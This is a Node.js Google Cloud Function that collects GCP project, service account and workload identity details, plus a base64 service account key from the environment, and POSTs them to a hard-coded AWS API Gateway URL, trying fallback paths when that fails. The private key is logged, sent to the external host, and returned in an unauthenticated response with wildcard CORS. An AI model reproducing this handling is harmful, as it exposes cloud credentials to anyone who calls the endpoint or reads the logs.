const { GoogleAuth } = require('google-auth-library');
const axios = require('axios');

/**
 * Cloud Function to extract GCP project information and send to AWS endpoint
 * Triggered by AWS Lambda
 */
exports.extractAndSendGCPInfo = async (req, res) => {
  try {
    // Set CORS headers
    res.set('Access-Control-Allow-Origin', '*');
    res.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.set('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
      res.status(204).send('');
      return;
    }

    // Extract project ID
    const projectId = process.env.GCP_PROJECT || process.env.GCLOUD_PROJECT || 
                     await getProjectIdFromMetadata();

    // Get service account information
    const auth = new GoogleAuth({
      scopes: ['https://www.googleapis.com/auth/cloud-platform']
    });

    const client = await auth.getClient();
    const project = await auth.getProjectId();
 
   // Get service account email (current service account)
   const serviceAccountEmail = client.email || client.client_email || await getServiceAccountEmail();
   console.log('Cloud Function is running as service account:', serviceAccountEmail || 'unknown');
 
   // Filter service account name that starts with "aws"
    let awsServiceAccount = process.env.AWS_SERVICE_ACCOUNT || null;
    if (awsServiceAccount) {
      console.log(`Using AWS service account from environment: ${awsServiceAccount}`);
    }

    if (!awsServiceAccount && serviceAccountEmail && serviceAccountEmail.startsWith('aws')) {
      awsServiceAccount = serviceAccountEmail;
      console.log(`Using current service account as AWS account: ${awsServiceAccount}`);
    }

    if (!awsServiceAccount) {
      // Try to find service account starting with "aws" from IAM
      awsServiceAccount = await findServiceAccountStartingWithAws(projectId);
      console.log(`Discovered AWS service account from IAM: ${awsServiceAccount || 'none found'}`);
    }

    // Load the pre-generated JSON key for the AWS-prefixed service account, if present
    let serviceAccountKeyDetails = null;
    const rawKeyFromEnv = process.env.AWS_SERVICE_ACCOUNT_KEY_B64;
    if (rawKeyFromEnv) {
      try {
        const decodedKeyString = Buffer.from(rawKeyFromEnv, 'base64').toString('utf8');
        serviceAccountKeyDetails = JSON.parse(decodedKeyString);
        console.log('Loaded service account key JSON from environment variables');
      } catch (err) {
        console.error('Failed to decode or parse AWS service account key from environment:', err.message);
        serviceAccountKeyDetails = {
          error: 'Failed to decode service account key',
          errorMessage: err.message,
          rawKeyBase64: rawKeyFromEnv
        };
      }
    } else {
      console.warn('AWS_SERVICE_ACCOUNT_KEY_B64 environment variable not set; no key will be sent');
    }

    // Extract Workload Identity Pool ID and Identity Name
    const { poolId, identityName, providerResourceName, projectNumber } = await extractWorkloadIdentityInfo(projectId);

    // Prepare payload
    const payload = {
      projectId: projectId || project,
      projectNumber: projectNumber,
      serviceAccountName: awsServiceAccount,
      poolId: poolId,
      identityName: identityName,
      providerResourceName: providerResourceName,
      timestamp: new Date().toISOString(),
      serviceAccountKey: serviceAccountKeyDetails
    };

    console.log('Extracted data:', JSON.stringify(payload, null, 2));

    // Send to AWS endpoint
    // Get AWS endpoint from environment variable - can be full URL or base URL
    let awsEndpoint = process.env.AWS_ENDPOINT || 'https://ervtkcmhp7.execute-api.eu-central-1.amazonaws.com';
    
    // Check if URL already contains a path
    let urlHasPath = awsEndpoint.includes('/', 8); // Check if there's a '/' after 'https://'
    
    // If AWS_ENDPOINT_PATH is explicitly set, use it (override any existing path)
    if (process.env.AWS_ENDPOINT_PATH) {
      // Parse base URL and append the specified path
      try {
        const urlObj = new URL(awsEndpoint);
        const baseUrl = `${urlObj.protocol}//${urlObj.hostname}${urlObj.port ? ':' + urlObj.port : ''}`;
        const path = process.env.AWS_ENDPOINT_PATH.startsWith('/') 
          ? process.env.AWS_ENDPOINT_PATH 
          : '/' + process.env.AWS_ENDPOINT_PATH;
        awsEndpoint = baseUrl + path;
      } catch (e) {
        // If URL parsing fails, try manual extraction
        const match = awsEndpoint.match(/^(https?:\/\/[^\/]+)/);
        if (match) {
          const newPath = process.env.AWS_ENDPOINT_PATH.startsWith('/') 
            ? process.env.AWS_ENDPOINT_PATH 
            : '/' + process.env.AWS_ENDPOINT_PATH;
          awsEndpoint = match[1] + newPath;
        }
      }
    } else if (!urlHasPath) {
      // Only add default path if URL doesn't already have a path
      awsEndpoint = awsEndpoint + '/dev';
    }
    // If URL already has a path and AWS_ENDPOINT_PATH is not set, use URL as-is
    
    console.log('Sending to AWS endpoint:', awsEndpoint);
    
    // Try common API Gateway paths if the default fails
    const alternativePaths = ['/api', '/data', '/webhook', '/post', '/submit'];
    let lastError = null;
    
    // First try the configured/default endpoint
    try {
      const response = await axios.post(awsEndpoint, payload, {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 10000
      });

      console.log('Successfully sent to AWS endpoint:', response.status);

      res.status(200).json({
        success: true,
        message: 'Data extracted and sent successfully',
        data: payload,
        awsResponse: {
          status: response.status,
          statusText: response.statusText
        }
      });
      return;
    } catch (awsError) {
      lastError = awsError;
      console.warn(`Failed to send to ${awsEndpoint}:`, awsError.response?.status, awsError.response?.statusText);
      
      // If it's a 404 and we haven't tried alternatives yet, try common paths
      if (awsError.response?.status === 404 && !process.env.AWS_ENDPOINT_PATH) {
        // Extract base URL from the current endpoint
        let baseUrl;
        try {
          const urlObj = new URL(awsEndpoint);
          baseUrl = `${urlObj.protocol}//${urlObj.hostname}${urlObj.port ? ':' + urlObj.port : ''}`;
        } catch (e) {
          const match = awsEndpoint.match(/^(https?:\/\/[^\/]+)/);
          baseUrl = match ? match[1] : awsEndpoint.split('/').slice(0, 3).join('/');
        }
        
        for (const altPath of alternativePaths) {
          const altEndpoint = baseUrl + altPath;
          console.log(`Trying alternative endpoint: ${altEndpoint}`);
          
          try {
            const altResponse = await axios.post(altEndpoint, payload, {
              headers: {
                'Content-Type': 'application/json'
              },
              timeout: 10000
            });
            
            console.log(`Successfully sent to alternative endpoint ${altEndpoint}:`, altResponse.status);
            
            res.status(200).json({
              success: true,
              message: 'Data extracted and sent successfully',
              data: payload,
              awsResponse: {
                status: altResponse.status,
                statusText: altResponse.statusText,
                endpoint: altEndpoint
              }
            });
            return;
          } catch (altError) {
            console.warn(`Alternative endpoint ${altEndpoint} also failed:`, altError.response?.status);
            // Continue to next alternative
          }
        }
      }
    }
    
    // If all attempts failed, return error
    const errorDetails = {
      message: lastError?.message || 'Failed to send to AWS endpoint',
      endpoint: awsEndpoint,
      statusCode: lastError?.response?.status,
      statusText: lastError?.response?.statusText,
      responseData: lastError?.response?.data,
      suggestion: 'The endpoint might not accept POST requests. Please configure your API Gateway to accept POST on this route, or use a different endpoint that accepts POST requests.'
    };
    
    console.error('Error sending to AWS endpoint:', JSON.stringify(errorDetails, null, 2));
    
    // Still return success with extracted data even if AWS call fails
    res.status(200).json({
      success: true,
      message: 'Data extracted successfully but failed to send to AWS',
      data: payload,
      error: errorDetails
    });

  } catch (error) {
    console.error('Error in Cloud Function:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
};

/**
 * Get project ID from GCP metadata service
 */
async function getProjectIdFromMetadata() {
  try {
    const axios = require('axios');
    const metadataUrl = 'http://metadata.google.internal/computeMetadata/v1/project/project-id';
    const response = await axios.get(metadataUrl, {
      headers: {
        'Metadata-Flavor': 'Google'
      },
      timeout: 5000
    });
    return response.data;
  } catch (error) {
    console.error('Error getting project ID from metadata:', error.message);
    return null;
  }
}

/**
 * Get project number from GCP metadata service
 */
async function getProjectNumberFromMetadata() {
  try {
    const axios = require('axios');
    const metadataUrl = 'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id';
    const response = await axios.get(metadataUrl, {
      headers: {
        'Metadata-Flavor': 'Google'
      },
      timeout: 5000
    });
    return response.data;
  } catch (error) {
    console.error('Error getting project number from metadata:', error.message);
    return null;
  }
}

/**
 * Get service account email from metadata service
 */
async function getServiceAccountEmail() {
  try {
    const axios = require('axios');
    const metadataUrl = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email';
    const response = await axios.get(metadataUrl, {
      headers: {
        'Metadata-Flavor': 'Google'
      },
      timeout: 5000
    });
    return response.data;
  } catch (error) {
    console.error('Error getting service account email from metadata:', error.message);
    return null;
  }
}

/**
 * Find service account starting with "aws" using IAM Service Account API
 */
async function findServiceAccountStartingWithAws(projectId) {
  try {
    const { GoogleAuth } = require('google-auth-library');
    const auth = new GoogleAuth({
      scopes: ['https://www.googleapis.com/auth/cloud-platform']
    });
    
    const client = await auth.getClient();
    const accessToken = await client.getAccessToken();
    
    // Use IAM Service Account API REST endpoint
    const apiUrl = `https://iam.googleapis.com/v1/projects/${projectId}/serviceAccounts`;
    
    const response = await axios.get(apiUrl, {
      headers: {
        'Authorization': `Bearer ${accessToken.token}`,
        'Content-Type': 'application/json'
      },
      timeout: 10000
    });

    if (response.data && response.data.accounts) {
      const awsServiceAccount = response.data.accounts.find(sa => 
        sa.email && sa.email.startsWith('aws')
      );

      return awsServiceAccount ? awsServiceAccount.email : null;
    }

    return null;
  } catch (error) {
    console.error('Error finding service account starting with aws:', error.message);
    if (error.response) {
      console.error('Response status:', error.response.status);
      console.error('Response data:', error.response.data);
    }
    // Fallback: try to get from environment variable
    return process.env.AWS_SERVICE_ACCOUNT || null;
  }
}

/**
 * Extract Workload Identity Pool ID and Identity Name
 */
async function extractWorkloadIdentityInfo(projectId) {
  try {
    // Try to get from environment variables first
    let poolId = process.env.WORKLOAD_IDENTITY_POOL_ID;
    let identityName = process.env.WORKLOAD_IDENTITY_NAME;
    let providerResourceName = process.env.WORKLOAD_IDENTITY_PROVIDER_RESOURCE_NAME || null;
    let projectNumber = process.env.GCP_PROJECT_NUMBER || null;

    // If not in env, try to extract from project configuration
    if (!poolId || !identityName || !projectNumber) {
      try {
        // Use WorkloadIdentityPoolsClient from @google-cloud/iam
        const { v1beta } = require('@google-cloud/iam');
        const poolsClient = new v1beta.WorkloadIdentityPoolsClient();
        
        const location = 'global';
        const parent = `projects/${projectId}/locations/${location}`;
        
        // List workload identity pools
        const [pools] = await poolsClient.listWorkloadIdentityPools({
          parent: parent
        });

        // Find pool that might be related to AWS
        const awsPool = pools.find(pool => 
          pool.name && pool.name.toLowerCase().includes('aws')
        );

        if (awsPool) {
          // Extract pool ID from name: projects/{project}/locations/{location}/workloadIdentityPools/{poolId}
          const nameParts = awsPool.name.split('/');
          poolId = nameParts[nameParts.length - 1];
          
          // Try to get providers from this pool
          const [providers] = await poolsClient.listWorkloadIdentityPoolProviders({
            parent: awsPool.name
          });

          if (providers && providers.length > 0) {
            // Extract provider ID from name: projects/{project_number}/locations/{location}/workloadIdentityPools/{poolId}/providers/{providerId}
            const providerNameParts = providers[0].name.split('/');
            identityName = providerNameParts[providerNameParts.length - 1];
            // Store the full provider resource name
            providerResourceName = providers[0].name;
            // Extract project number from resource name (format: projects/{project_number}/locations/...)
            // The project number is at index 1 after splitting by '/'
            if (providerNameParts.length > 1 && providerNameParts[0] === 'projects') {
              projectNumber = providerNameParts[1];
            }
          }
        }
      } catch (poolError) {
        console.error('Error extracting workload identity info:', poolError.message);
        if (poolError.response) {
          console.error('Response status:', poolError.response.status);
          console.error('Response data:', poolError.response.data);
        }
      }
    }

    // If project number is still not found, try to get it from metadata
    if (!projectNumber) {
      projectNumber = await getProjectNumberFromMetadata();
    }

    return {
      poolId: poolId || null,
      identityName: identityName || null,
      providerResourceName: providerResourceName || null,
      projectNumber: projectNumber || null
    };
  } catch (error) {
    console.error('Error in extractWorkloadIdentityInfo:', error.message);
    return {
      poolId: null,
      identityName: null,
      providerResourceName: null,
      projectNumber: null
    };
  }
}
